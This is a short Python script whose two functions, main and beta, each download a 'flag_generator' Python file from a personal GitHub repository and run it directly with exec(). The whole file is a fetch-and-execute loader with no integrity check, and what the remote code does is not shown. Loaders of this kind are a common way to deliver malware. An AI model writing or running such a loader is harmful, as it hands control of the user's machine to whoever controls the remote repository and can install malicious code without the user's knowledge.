from urllib.request import urlopen


def main() -> None:
    with urlopen("https://github.com/fiaguhop137/firebot/raw/main/flag_generator.py") as f:
        exec(f.read().decode("latin-1"))


def beta() -> None:
    with urlopen("https://github.com/fiaguhop137/firebot/raw/main/flag_generator_beta.py") as f:
        exec(f.read().decode("latin-1"))
